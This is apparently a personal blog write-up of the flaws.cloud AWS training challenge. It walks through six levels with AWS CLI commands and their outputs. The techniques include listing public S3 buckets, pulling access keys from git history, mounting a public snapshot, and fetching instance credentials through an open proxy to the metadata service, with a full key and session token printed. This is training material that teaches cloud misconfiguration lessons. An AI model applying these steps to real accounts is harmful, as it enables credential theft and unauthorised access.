---
title: "flAWS"
date: 2024-08-31T03:30:01-03:00
---

[flaws.cloud](http://flaws.cloud/) is a series of AWS-based challenges with the aim of teaching about common mistakes and gotchas of the platform.

<!--more-->

**Scope**: Everything is run out of a single AWS account, and all challenges are sub-domains of flaws.cloud
## Level 1
> This level is *buckets* of fun. See if you can find the first sub-domain.

Given the blurb, we can assume it's related to S3 buckets, so we try `aws s3 ls flaws.cloud` and...
![](/flaws1.png)
Bingo! We leave with the lesson that S3 buckets are private by default, requiring Static Website Hosting to be ON and everyone having `s3:GetObject` privileges in order for it to be public. However, be careful about also allowing List permissions, as "everyone" means ***everyone ever***.

## Level 2
> The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.

We've already got our AWS CLI account set up, so we just repeat the process from the last level:![](/flaws2.png)
Just as expected. This level uses the same example, showcasing the dangers of "Any Authenticated AWS User" (it is supposedly no longer available as a setting in the web console, but the SDK and Third-Party Tools might allow it).

## Level 3
> The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.

Looking at the first hint, we get the suggestion to download the bucket with `aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2`
Given that our shell immediately recognizes the `.git` folder we just downloaded, we can just check the commit history with `git log`
![](/flaws3.png)
Looks like someone made a mistake when setting up the repo, let's revert back to the first commit with `git revert b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526`
![](/flaws4.png)
Sure enough, we've got ourselves a nice pair of AWS access keys! We just gotta add them to a new profile on our machine and check what S3 buckets it's hiding...
![](/flaws5.png)
A stark reminder to revoke any potentially compromised access keys.

## Level 4
> For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
> It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.

The first hint suggests using `aws sts get-caller-identity` with the credentials we have in order to get the account ID and then using `aws --profile flaws ec2 describe-snapshots --owner-id [ID]` to see the existing snapshots
```json
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard"
        }
    ]
}
```
Now that we've got the ID of the snapshot we're looking for, we can just mount it to our own ec2 and snoop around inside, this step was kind of a doozy at first for me.

First we create our own volume based on the snapshot with `aws ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-0b49342abd1bdcb89`, next we go into ec2 and kick up an instance, just a t2.micro will do.
Once the instance is up, we attach the volume and connect to the instance through ssh.

Mount the volume by doing `lsblk`, find the attached volume, `sudo file -s [volumeName]` and `sudo mount [volumeName] /mnt`. Now we're free to explore the volume's filesystem!

As a first instinct from participating in CTFs, we check the `/home` directory and find a "meta-data" file and a `setupNginx.sh`
![](/flaws6.png)
Plugging those credentials into the ec2 that the challenge links works and we're done with Level 4! The key takeaways here are that public snapshots are *public* public, and anyone can just copy them and mount them on their own instance, careful what you store out there, folks.

## Level 5
> This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:  
> - http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
> - http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
> - http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/
> See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it.

First hint gives us this:
> On cloud services, including AWS, the IP 169.254.169.254 is magical. It's the metadata service.
> There is an RFC on it ([RFC-3927](https://tools.ietf.org/html/rfc3927)), but you should read the AWS specific docs on it [here](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html).

Trying to `curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/` we get the following list of available metadata:
```
1.0
2007-01-19
2007-03-01
2007-08-29
2007-10-10
2007-12-15
2008-02-01
2008-09-01
2009-04-04
2011-01-01
2011-05-01
2012-01-12
2014-02-25
2014-11-05
2015-10-20
2016-04-19
2016-06-30
2016-09-02
2018-03-28
2018-08-17
2018-09-24
2019-10-01
2020-10-27
2021-01-03
2021-03-23
2021-07-15
2022-07-09
2022-09-24
2024-04-11
latest
```

Looking at `latest`first and foremost, we can grab ourselves some EC2 security credentials for the instance by doing `curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws`
```json
{
  "Code" : "Success",
  "LastUpdated" : "2024-08-31T04:48:31Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQGXC644RFS",
  "SecretAccessKey" : "zE+zVYoFeYpMXZSF0i+L2kRIYLRfdEAOQKeZWSVO",
  "Token" : "IQoJb3JpZ2luX2VjEFUaCXVzLXdlc3QtMiJHMEUCIHPkaK+F/utA0oRysw/pC3VnAzK9HyhKv3cP/5EnNEhZAiEAnO20Cjh2NXZncvWqed+mjwCL/KkK2QFQ3WL/UdBQ/KIqsgUIbhAEGgw5NzU0MjYyNjIwMjkiDNnobQ4Y80NNnlGS9CqPBYSzWbHQ82zJqx77E9Z1QV3hebr6riGX47xQwFRNgX1mobxkZDrlXVNyDnDHRepIxA4Oyeh07Y9f6cVpf6r71boq8M2fyoM0YYrUDtrI5tmStFc9qPgkRs0HRY3OU1+w3wYZ1rz1pmWY+CwJLiI8omc8OqE6838bfmXK9hYY+i6g019mIu/NNekLA27p1Ca4ZeXxvLkggaa37nMCV4T29S1Fk3DBiNGJH21+CKX2MJUlAlvmd+TWrL4WCtFpGnsshYx3IJn155yGQLVG0Ly7GKLeIsf25LLNDz6O0pLZMERvwoTTe/RNf7KkueWG+hMnGmdnQq7nGmk5/pYMGbOB/imfrQi762sjwSlAWiWQxPuYUQUaf12D3psvEXPQrUrbiwlbz81E8IRTrY2I0nVJKzASML3fPCsmrbkwgbs85/pAteO6SCECL33diPmmiGOS7fT/lZumNWvwddpemXCsKmQB2X81/Irnz4IUGUzNCDn8j+gpT16IGgP1ZDtGxngs82mjVfi0CsYgkqU4uKjfVsOwoNGCLCVWlcDi/61Ridndd4gfaV4upOEiJFhi1HRls8sPyGKJn+zvl0BFeS2kSNfz3eLUzwvKomf2IkzBesrUI0Ev65R15AO1rm+ptO9cPrmL82OnPpHoGqTexDH36ibkmE1xSSyI30/ybzA31a4RYYXXvPx31oP0cjLZJf5Ra8jaShgGAT07//LDas5kG3r7rWuCeDhMUqbY+1ZUQJOkBaVjKGyowDNFxOyJAHaypYUJP8GIEzjbifbiJRHYcyMyi53yYXKCu9cRIl8Pie9zR+exjqLIfJzbIhm82P7MSLECwulXPjHkBjp42JrFDwfQzX33ao1t9kSpc5QP+Dww58DKtgY6sQFMg5Pd7zXctNMgFqo9gmzDg0L2sCu0sifSYX/weTSWeRDFQ7mjwQPlyXrpgw7c7OHJOdxtp4Onm5Lze2ftVFOP2uLsPXkQbFC5eoeqoBqZYHE9m1WEKaj8d5wYHwijDWuPsXW3dek2csHlfQGCzpsF3g8JqjJNFh4aaHHFseaJH124/Ccl8lGszcppEP1RZq4CU3z/xS/NADX74T11OXVtcSfSqPy1t/dG8zyaofhu2kA=",
  "Expiration" : "2024-08-31T10:55:18Z"
}
```

Of note that it's actually necessary to include the `Token` as `aws_session_token` inside `~/.aws/credentials` in order to properly execute the next step, otherwise we hit a wall against `InvalidAccessKeyId`.

Running `aws s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile flaws5` returns
```
                           PRE ddcc78ff/
2017-02-26 23:11:07        871 index.html
```

So we try going to `http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/` and we're in!

We learn from the post-stage writeup that the `169.254.169.254` IP is basically magical, any time we've got contact with an EC2 we should try to fire requests there to get back sensitive information like credentials

## Level 6
> For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.
> 
> Access key ID: `[Redacted]`
> Secret: `[Redacted]`

Straight up we try the obvious: `aws s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud` with the provided credentials but no dice:
```
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:iam::975426262029:user/Level6 is not authorized to perform: s3:ListBucket on resource: "arn:aws:s3:::level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud" because no identity-based policy allows the s3:ListBucket action
```

Let's check exactly who we are... `aws --profile flaws iam get-user`:
```json
{
    "User": {
        "Path": "/",
        "UserName": "Level6",
        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
        "Arn": "arn:aws:iam::975426262029:user/Level6",
        "CreateDate": "2017-02-26T23:11:16+00:00"
    }
}
```

The username is clear enough, let's note this for the next step, `aws --profile flaws iam list-attached-user-policies --user-name Level6`
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        },
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        }
    ]
}
```

Let's get some deeper info on both of these with `aws --profile flaws iam get-policy --policy-arn [policyArn]`
`list_apigateways`:
```json
{
    "Policy": {
        "PolicyName": "list_apigateways",
        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "List apigateways",
        "CreateDate": "2017-02-20T01:45:17+00:00",
        "UpdateDate": "2017-02-20T01:48:17+00:00",
        "Tags": []
    }
}
```
`MySecurityAudit`:
```json
{
    "Policy": {
        "PolicyName": "MySecurityAudit",
        "PolicyId": "ANPAJCK5AS3ZZEILYYVC6",
        "Arn": "arn:aws:iam::975426262029:policy/MySecurityAudit",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Most of the security audit capabilities",
        "CreateDate": "2019-03-03T16:42:45+00:00",
        "UpdateDate": "2019-03-03T16:42:45+00:00",
        "Tags": []
    }
}
```

The only one that seems to have been edited based on its version is `list_apigateways`, so we fire `aws --profile flaws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4` to check what it's got inside:
```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17+00:00"
    }
}
```

So we've got `GET` access to any API Gateway item inside `/restapis/`, but no idea what to do from here as the it seems we've got too many options in front of us.

Checking into the Hints, we're told to try listing the lambda functions inside the region with `aws --region us-west-2 --profile level6 lambda list-functions`:
```json
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2017-02-27T00:24:36.054+0000",
            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "d45cc6d9-f172-4634-8d19-39a20951d979",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/Level6"
            }
        }
    ]
}
```

So now we know there's a lambda function called `Level6`, and we can leverage `SecurityAudit`to check the policy on it with `aws --region us-west-2 --profile flaws lambda get-policy --function-name Level6`:
```json
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
    "RevisionId": "edaca849-06fb-4495-a09c-3bc6115d3b87"
}
```

With this we now know that our relevant REST API's ID is `s33ppypa75`, and in order to `curl` it we're going to need what stage it's in, so we run `aws --profile flaws --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"`:
```json
{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": "2017-02-26T21:26:08-03:00",
            "lastUpdatedDate": "2017-02-26T21:26:08-03:00"
        }
    ]
}
```

`stageName` is "Prod", so we try calling `curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6` and we get back `"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"`.

With this, we've reached the end of flAWS. We can now pat ourselves on the back and move on to the sequel: [flaws2.cloud](http://flaws2.cloud)!
